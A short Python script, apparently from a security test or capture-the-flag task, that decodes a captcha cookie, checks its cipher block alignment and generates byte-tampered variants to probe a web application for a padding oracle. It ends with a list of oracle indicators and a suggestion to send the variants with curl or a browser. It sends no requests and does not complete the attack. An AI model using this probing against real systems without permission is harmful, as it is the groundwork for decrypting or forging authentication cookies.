import base64

# Use the captcha cookie from auth data
captcha = "ptooGtolIxCZN64c5AXSfgz8UW/uDf0SSFQi26wIHJ4="

print(f"Captcha cookie: {captcha}")

# Decode
decoded = base64.b64decode(captcha)
print(f"\nDecoded length: {len(decoded)} bytes")
print(f"Decoded hex: {decoded.hex()}")

# Check block alignment
print(f"\nBlock alignment analysis:")
print(f"  Multiple of 16 (AES): {len(decoded) % 16 == 0} ({'YES - likely AES-CBC!' if len(decoded) % 16 == 0 else 'NO'})")
print(f"  Multiple of 8 (DES): {len(decoded) % 8 == 0}")

# Generate test variations
print(f"\nGenerating test variations:")

# Original
print(f"\n1. Original:")
print(f"   Base64: {captcha}")
print(f"   Hex: {decoded.hex()}")

# Last byte +1
modified = bytearray(decoded)
original_last = modified[-1]
modified[-1] = (modified[-1] + 1) % 256
test1 = base64.b64encode(bytes(modified)).decode()
print(f"\n2. Last byte +1 (0x{original_last:02x} -> 0x{modified[-1]:02x}):")
print(f"   Base64: {test1}")

# Last byte +2
modified = bytearray(decoded)
modified[-1] = (modified[-1] + 2) % 256
test2 = base64.b64encode(bytes(modified)).decode()
print(f"\n3. Last byte +2 (0x{original_last:02x} -> 0x{modified[-1]:02x}):")
print(f"   Base64: {test2}")

# Last byte = 0x00
modified = bytearray(decoded)
modified[-1] = 0x00
test3 = base64.b64encode(bytes(modified)).decode()
print(f"\n4. Last byte = 0x00:")
print(f"   Base64: {test3}")

# Last byte = 0xFF
modified = bytearray(decoded)
modified[-1] = 0xFF
test4 = base64.b64encode(bytes(modified)).decode()
print(f"\n5. Last byte = 0xFF:")
print(f"   Base64: {test4}")

# Truncated
truncated = decoded[:-1]
test5 = base64.b64encode(truncated).decode()
print(f"\n6. Truncated by 1 byte ({len(decoded)} -> {len(truncated)}):")
print(f"   Base64: {test5}")

# First byte +1
modified = bytearray(decoded)
original_first = modified[0]
modified[0] = (modified[0] + 1) % 256
test6 = base64.b64encode(bytes(modified)).decode()
print(f"\n7. First byte +1 (0x{original_first:02x} -> 0x{modified[0]:02x}):")
print(f"   Base64: {test6}")

# Middle byte +1
modified = bytearray(decoded)
mid_idx = len(modified) // 2
original_mid = modified[mid_idx]
modified[mid_idx] = (modified[mid_idx] + 1) % 256
test7 = base64.b64encode(bytes(modified)).decode()
print(f"\n8. Middle byte +1 (index {mid_idx}, 0x{original_mid:02x} -> 0x{modified[mid_idx]:02x}):")
print(f"   Base64: {test7}")

print(f"\n" + "="*80)
print("PADDING ORACLE INDICATORS TO LOOK FOR:")
print("="*80)
print("1. Different error messages between tests")
print("2. Different response times (timing oracle)")
print("3. Different HTTP status codes")
print("4. Some tests succeed vs fail")
print("5. Specific patterns in which byte positions cause different responses")
print("\nNext step: Test these cookies manually or with curl/browser to observe responses")

